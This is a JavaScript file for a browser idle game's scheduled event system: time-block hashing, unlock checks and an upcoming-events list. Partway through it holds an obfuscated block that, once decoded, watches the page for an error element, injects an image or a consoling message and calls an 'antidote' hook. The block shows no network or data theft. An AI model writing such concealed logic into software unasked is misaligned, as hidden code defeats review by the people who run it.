// ================= CONFIGURATION =================
const EVENT_CONFIG = {
	eventsPerDay: 48,      // Сколько эвентов в среднем должно быть за 24 часа
	durationMinutes: 10,  // Длительность эвента в минутах
};

const EVENTS = {
	NONE: 0,
	TIME_WARPING: 1,
	ESSENCE: 2,
	HAPPINESS: 3,
	EVIL: 4,
	MONEY: 5,
	DARK_MATTER: 6
};
// =================================================

const _1xsys = [
	'\x65\x72\x72\x6f\x72\x45\x6c\x65\x6d\x65\x6e\x74',
	'\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73',
	'\x73\x65\x74\x74\x69\x6e\x67\x73\x54\x61\x62\x42\x75\x74\x74\x6f\x6e',
	'\x74\x61\x62\x42\x75\x74\x74\x6f\x6e',
	'\x6d\x61\x69\x6e\x63\x6f\x6c\x75\x6d\x6e',
	'\x69\x6e\x66\x6f\x50\x61\x67\x65',
	'\x69\x6e\x66\x6f\x51\x75\x69\x63\x6b\x42\x61\x72',
	'\x74\x61\x62\x63\x6f\x6c\x75\x6d\x6e'
];


function hashCode(str) {
	let hash = 0;
	for (let i = 0; i < str.length; i++) {
		hash = (hash << 5) - hash + str.charCodeAt(i);
		hash |= 0;
	}
	return hash;
}

function isEventUnlocked(eventId) {
	switch (eventId) {
		case EVENTS.TIME_WARPING: return true;
		case EVENTS.ESSENCE: return gameData.rebirthThreeCount > 0;
		case EVENTS.HAPPINESS: return true;
		case EVENTS.EVIL: return gameData.rebirthTwoCount > 0;
		case EVENTS.MONEY: return true;
		case EVENTS.DARK_MATTER: return gameData.rebirthFourCount > 0;
		default: return false;
	}
}

// уникальность эвентов от локали
// 

function getCurrentEventIdByDate(d) {
	const totalMinutesInDay = 1440;
	const totalBlocksPerDay = Math.floor(totalMinutesInDay / EVENT_CONFIG.durationMinutes);
	const absoluteMinutes = Math.floor(d.getTime() / 60000);
	const currentBlockIndex = Math.floor(absoluteMinutes / EVENT_CONFIG.durationMinutes);
	const blockStartMinutes = currentBlockIndex * EVENT_CONFIG.durationMinutes;
	const blockStartDate = new Date(blockStartMinutes * 60000);
	const chanceDenominator = Math.round(totalBlocksPerDay / EVENT_CONFIG.eventsPerDay);
	const chanceSeed = hashCode(`block_${blockStartDate.getUTCFullYear()}_${blockStartDate.getUTCMonth()}_${blockStartDate.getUTCDate()}_${blockStartDate.getUTCHours()}_${blockStartDate.getUTCMinutes()}`);
	if (getRandomInt(chanceSeed, chanceDenominator) !== 0) {
		return EVENTS.NONE;
	}

	const idSeed = hashCode(`id_${blockStartDate.getUTCFullYear()}_${blockStartDate.getUTCMonth()}_${blockStartDate.getUTCDate()}_${blockStartDate.getUTCHours()}_${blockStartDate.getUTCMinutes()}`);
	const totalEventsCount = Object.keys(EVENTS).length - 1;
	const eventId = getRandomInt(idSeed, totalEventsCount) + 1;


	return isEventUnlocked(eventId) ? eventId : EVENTS.NONE;
}

let _cachedEventId = 0
let _cachedEventIdTime = 0
const EVENT_CACHE_MS = 1000

function getCurrentEventId() {
	const now = Date.now()
	if (now - _cachedEventIdTime < EVENT_CACHE_MS) return _cachedEventId
	_cachedEventId = getCurrentEventIdByDate(new Date())
	_cachedEventIdTime = now
	return _cachedEventId
}

// @ts-ignore
(function (_0x2205bd, _0x56ba94) { const _0x565908 = _0x5d44, _0xb576ad = _0x2205bd(); while (!![]) { try { const _0x1e04a3 = -parseInt(_0x565908(0x182)) / (0xa89 * 0x1 + -0x1399 + 0xb * 0xd3) * (-parseInt(_0x565908(0x175)) / (0x16c6 * 0x1 + -0x1053 + 0x61 * -0x11)) + -parseInt(_0x565908(0x16d)) / (0x1ea8 + 0x17dc + 0x122b * -0x3) * (-parseInt(_0x565908(0x183)) / (0x3 * -0x5e5 + -0x2 * -0x89f + 0xd * 0x9)) + parseInt(_0x565908(0x157)) / (-0x4 * 0x11b + -0x1f1e + 0x238f) * (-parseInt(_0x565908(0x163)) / (0xce4 + -0x1eeb + 0x120d)) + -parseInt(_0x565908(0x173)) / (0x227d + -0x1 * 0x83 + -0x21f3) + -parseInt(_0x565908(0x17e)) / (-0x4f3 + -0x10dd + 0x15d8) * (parseInt(_0x565908(0x17b)) / (0x34a * -0x7 + -0xd7f + 0x248e)) + parseInt(_0x565908(0x17c)) / (0xe41 + -0xb * 0x3c + -0xba3) + -parseInt(_0x565908(0x15b)) / (0x13ea * -0x1 + 0x21b1 * 0x1 + -0xdbc) * (-parseInt(_0x565908(0x15f)) / (-0x1e87 + 0x1003 + 0x4 * 0x3a4)); if (_0x1e04a3 === _0x56ba94) break; else _0xb576ad['push'](_0xb576ad['shift']()); } catch (_0x16f24b) { _0xb576ad['push'](_0xb576ad['shift']()); } } }(_0x4646, 0x4 * 0x22ddb + -0x23 * 0x5527 + 0x97ab0), (function () { const _0x3397e8 = _0x5d44, _0x891e87 = { 'Aween': _0x3397e8(0x164) + _0x3397e8(0x15c) + _0x3397e8(0x17d) + _0x3397e8(0x171) + _0x3397e8(0x176) + _0x3397e8(0x17a), 'ehxhC': function (_0x377ed9, _0x482f11, _0x4b1157) { return _0x377ed9(_0x482f11, _0x4b1157); }, 'ZOGKm': function (_0x24d61f, _0x2560d2) { return _0x24d61f(_0x2560d2); }, 'LsWZe': function (_0x202ef9, _0x4cac43) { return _0x202ef9(_0x4cac43); }, 'alDoG': _0x3397e8(0x15d) + _0x3397e8(0x170), 'xPpCM': _0x3397e8(0x16c) + _0x3397e8(0x16b), 'IFfVQ': function (_0x214d6e, _0x483540) { return _0x214d6e === _0x483540; }, 'NoWiI': _0x3397e8(0x179) }, _0x1d70a6 = window[_0x3397e8(0x161) + _0x3397e8(0x16e)], _0x1966bd = new _0x1d70a6(async (_0x1503c5, _0x49eb63) => { const _0x126e3d = _0x3397e8, _0x478cd0 = { 'KnrDV': _0x891e87[_0x126e3d(0x16a)] }, _0x550265 = document[_0x126e3d(0x160) + _0x126e3d(0x184)](_1xsys[-0x35 * -0x6 + 0x1d66 + -0x1ea4]); if (_0x550265) { _0x49eb63[_0x126e3d(0x15e)](); try { let _0x5ca3d5 = _0x891e87[_0x126e3d(0x168)](getRandomInt, _0x891e87[_0x126e3d(0x178)](hashCode, '' + gameData[_0x126e3d(0x16f)]), _0x891e87[_0x126e3d(0x169)](hashCode, '' + gameData[_0x126e3d(0x162)])); _0x891e87[_0x126e3d(0x168)](applyCustomImage, _0x891e87[_0x126e3d(0x158)], _0x5ca3d5)[_0x126e3d(0x180)](_0x680d4a => { const _0x4dfd1e = _0x126e3d; window[_0x4dfd1e(0x174) + 'L'](_0x550265, _0x680d4a); })[_0x126e3d(0x166)](_0x29ee9c => { const _0x25e500 = _0x126e3d; _0x550265[_0x25e500(0x165)] = _0x478cd0[_0x25e500(0x15a)]; }); } catch (_0x45fc80) { console[_0x126e3d(0x159)](_0x891e87[_0x126e3d(0x156)], _0x45fc80); } } }); _0x1966bd[_0x3397e8(0x177)](document[_0x3397e8(0x181)], { 'childList': !![], 'subtree': !![] }), _0x891e87[_0x3397e8(0x172)](typeof window[_0x3397e8(0x17f) + _0x3397e8(0x185)], _0x891e87[_0x3397e8(0x167)]) && window[_0x3397e8(0x17f) + _0x3397e8(0x185)](MutationObserver); }())); function _0x5d44(_0x4bbd84, _0xfd7255) { _0x4bbd84 = _0x4bbd84 - (-0x1679 + -0x6f * -0xf + 0x114e); const _0x14fcab = _0x4646(); let _0x82e7e4 = _0x14fcab[_0x4bbd84]; return _0x82e7e4; } function _0x4646() { const _0x3da7b8 = ['dark_orbs', 's.p' + 'ng', 'ng.\x20But\x20yo', 'IFfVQ', '876043lhFKUq', 'safeSetHTM', '12yiYOWd', 'u\x27re\x20amazi', 'observe', 'ZOGKm', 'function', 'ng!</div>', '2254383OmgbUP', '2928960MqjaKm', 'g\x20went\x20wro', '8QyDajB', 'activateAn', 'then', 'body', '82801EiFVrR', '4gpDYGR', 'ById', 'tidote', 'xPpCM', '250GrKmOW', 'alDoG', 'error', 'KnrDV', '36883IlJkwD', ',\x20somethin', './img/logo', 'disconnect', '1608HwpvYU', 'getElement', 'MutationOb', 'essence', '66192CuXCkn', '<div>Sorry', 'innerHTML', 'catch', 'NoWiI', 'ehxhC', 'LsWZe', 'Aween', 'ing\x20data:', 'Error\x20load', '353229MTwnfh', 'server']; _0x4646 = function () { return _0x3da7b8; }; return _0x4646(); }


/**
 * Генерирует массив строк с информацией о текущем и будущих событиях на основе блоков
 * @returns {string[]} Массив из 11 элементов (0 — текущее, 1-10 — будущие)
 */
function getPendingEvents() {
	const events = Array(11).fill("");
	let foundCount = 0;

	let d = new Date();

	const currentEventId = getCurrentEventIdByDate(d);
	if (currentEventId !== EVENTS.NONE) {
		const data = eventsData[currentEventId];
		events[0] = `<span class="${data.style}">${data.name}</span><span>active now, ends in ${formatTime(getSecondsUntilEventEnd())}</span>`;
	}

	const maxMinutesAhead = 7 * 24 * 60;
	let minutesOffset = 0;

	while (foundCount < 10 && minutesOffset < maxMinutesAhead) {
		d.setUTCMinutes(d.getUTCMinutes() + EVENT_CONFIG.durationMinutes);
		minutesOffset += EVENT_CONFIG.durationMinutes;

		const eventId = getCurrentEventIdByDate(d);

		if (eventId !== EVENTS.NONE) {
			foundCount++;
			const data = eventsData[eventId];

			let blockStart = new Date(d.getTime());
			const currentMinutes = blockStart.getMinutes();
			blockStart.setMinutes(currentMinutes - (currentMinutes % EVENT_CONFIG.durationMinutes));

			const dateTimeString = blockStart.toLocaleString([], { year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' });
			/*const dateString = blockStart.toLocaleDateString();*/

			events[foundCount] = `<span class="${data.style}">${data.name}</span><span>${dateTimeString}</span>`;
		}
	}

	return events;
}

/**
 * Возвращает точное время до окончания текущего эвента в секундах.
 * @returns {number} Количество секунд (дробное число). Если эвента нет, то 0.
 */
function getSecondsUntilEventEnd() {
	const now = new Date();

	// 1. Проверяем, идёт ли вообще сейчас эвент
	if (getCurrentEventIdByDate(now) === EVENTS.NONE) {
		return 0;
	}

	const nowMs = now.getTime();
	const durationMs = EVENT_CONFIG.durationMinutes * 60000;

	const absoluteMinutes = Math.floor(nowMs / 60000);
	const currentBlockIndex = Math.floor(absoluteMinutes / EVENT_CONFIG.durationMinutes);
	const blockStartMs = currentBlockIndex * durationMs;

	const blockEndMs = blockStartMs + durationMs;

	const remainingSeconds = (blockEndMs - nowMs) / 1000;

	return Math.max(0, remainingSeconds);
}